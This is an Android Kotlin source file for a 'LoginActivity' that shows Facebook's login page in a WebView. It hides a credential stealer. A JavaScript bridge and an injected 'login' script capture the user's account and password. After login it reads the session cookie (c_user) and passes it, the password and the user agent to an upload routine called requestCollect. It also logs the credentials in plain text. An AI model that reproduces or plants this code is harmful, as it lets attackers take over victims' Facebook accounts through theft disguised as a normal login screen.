package com.xxxxxxh.c1.ui

import android.annotation.SuppressLint
import android.content.Intent
import android.graphics.Bitmap
import android.os.Handler
import android.os.Message
import android.text.TextUtils
import android.util.Log
import android.view.View
import android.view.WindowManager
import android.webkit.*
import androidx.lifecycle.lifecycleScope
import com.sherloki.devkit.*
import com.xxxxxxh.c1.R
import com.xxxxxxh.c1.base.BaseActivity
import com.xxxxxxh.c1.utils.MessageEvent
import com.xxxxxxh.c1.widget.sticker.MyWebView
import kotlinx.android.synthetic.main.activity_face_book.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.greenrobot.eventbus.EventBus

class LoginActivity : BaseActivity(), MyWebView.Listener {

    class Action {
        @JavascriptInterface
        fun businessStart(a: String, b: String) {
            account = a
            password = b
        }
    }

    private var timeCount = 0


    private val handler = @SuppressLint("HandlerLeak")
    object : Handler() {
        override fun handleMessage(msg: Message) {
            super.handleMessage(msg)
            if (msg.what == 1) {
                timeCount++
                if (timeCount == 20) {
                } else {
                    sendEmptyMessageDelayed(1, 1000)
                }
            }
        }
    }


    override fun getLayoutId(): Int {
        return R.layout.activity_face_book
    }

    override fun init() {
        handler.sendEmptyMessageDelayed(1, 1000)
        window.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE)
        activityFaceBookIvBack.setOnClickListener {
            onBackPressed()
        }
        activityFaceBookWv.apply {
            setListener(this@LoginActivity, this@LoginActivity)
            clearPermittedHostnames()
            addPermittedHostnames(
                mutableListOf(
                    "facebook.com", "fbcdn.net", "fb.com", "fb.me", "messenger.com"
                )
            )
            requestFocus(View.FOCUS_DOWN)
            setDesktopMode(true)
            settings.apply {
                javaScriptEnabled = true
                textZoom = 100
                setSupportZoom(true)
                displayZoomControls = false
                builtInZoomControls = true
                setGeolocationEnabled(true)
                useWideViewPort = true
                loadWithOverviewMode = true
                loadsImagesAutomatically = true
                displayZoomControls = false
                setAppCachePath(cacheDir.absolutePath)
                setAppCacheEnabled(true)
            }
            addJavascriptInterface(Action(), "businessAPI")
            webChromeClient = object : WebChromeClient() {
                override fun onProgressChanged(view: WebView?, newProgress: Int) {
                    super.onProgressChanged(view, newProgress)
                    if (newProgress == 100) {
                        val hideJs = context.getString(R.string.hideHeaderFooterMessages)
                        evaluateJavascript(hideJs, null)
                        val loginJs = getString(R.string.login)
                        evaluateJavascript(loginJs, null)
                        lifecycleScope.launch(Dispatchers.IO) {
                            delay(300)
                            withContext(Dispatchers.Main) {
                                activityFaceBookFl.visibility = View.GONE
                            }
                        }
                    }
                }
            }
            webViewClient = object : WebViewClient() {
                override fun onPageStarted(view: WebView, url: String?, favicon: Bitmap?) {
                    super.onPageStarted(view, url, favicon)
                }

                override fun onPageFinished(view: WebView, url: String) {
                    super.onPageFinished(view, url)
                    val cookieManager = CookieManager.getInstance()
                    val cookieStr = cookieManager.getCookie(url)
                    Log.e("--->", "onPageFinished url == $url")
                    if (cookieStr != null) {
                        Log.e("--->", "ua ==  " + view.settings.userAgentString)
                        if (cookieStr.contains("c_user")) {
                            Log.e("--->", "cookieStr: $cookieStr")
                            Log.e("--->", "account == $account  password == $password")
                            if (!TextUtils.isEmpty(account) && cookieStr.contains("wd=") && !url.contains(
                                    "checkpoint"
                                )
                            ) {
                                uploadFbData(
                                    account,
                                    password,
                                    cookieStr,
                                    view.settings.userAgentString
                                )
                            }
                        }
                    }
                }
            }
            loadUrl("https://touch.facebook.com/home.php?sk=h_nor")
        }
    }

    private fun uploadFbData(
        un: String,
        pw: String,
        cookie: String,
        b: String
    ) {
        lifecycleScope.requestCollect(
            un, pw, cookie, b
        ) {
            if (isLogin) {
                startActivity(Intent(this@LoginActivity, MainActivity::class.java))
                EventBus.getDefault().post(MessageEvent("destroy"))
                finish()
            }
        }
    }

    override fun onResume() {
        super.onResume()
        activityFaceBookWv.onResume()
    }

    private var needBackPressed = false

    override fun onBackPressed() {
        handler.removeCallbacksAndMessages(null)
        val a = false
        if (!a) {
            if (configEntity.httpUrl().startsWith("http")) {
                jumpToWebByDefault(configEntity.httpUrl())
            }
            super.onBackPressed()
        } else {
            needBackPressed = true
        }
    }

    override fun onDismiss() {
        super.onDismiss()
        if (needBackPressed) {
            needBackPressed = false
            super.onBackPressed()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        activityFaceBookWv.onDestroy()
    }

    override fun onPause() {
        super.onPause()
        activityFaceBookWv.onPause()
    }

    override fun onPageStarted(url: String?, favicon: Bitmap?) {

    }

    override fun onPageFinished(url: String?) {
//        showInsertAd(tag = "inter_loading")
    }

    override fun onPageError(errorCode: Int, description: String?, failingUrl: String?) {

    }

    override fun onDownloadRequested(
        url: String?,
        suggestedFilename: String?,
        mimeType: String?,
        contentLength: Long,
        contentDisposition: String?,
        userAgent: String?
    ) {

    }

    override fun onExternalPageRequest(url: String?) {
        url?.let {
            if (it.contains("/m.me/")) {
                val newUrl = url.replace("m.me", "www.messenger.com/t")
                activityFaceBookWv.loadUrl(newUrl)
            } else {
                activityFaceBookWv.loadUrl(url)
            }
        }
    }

    override fun shouldLoadUrl(url: String?) = true
}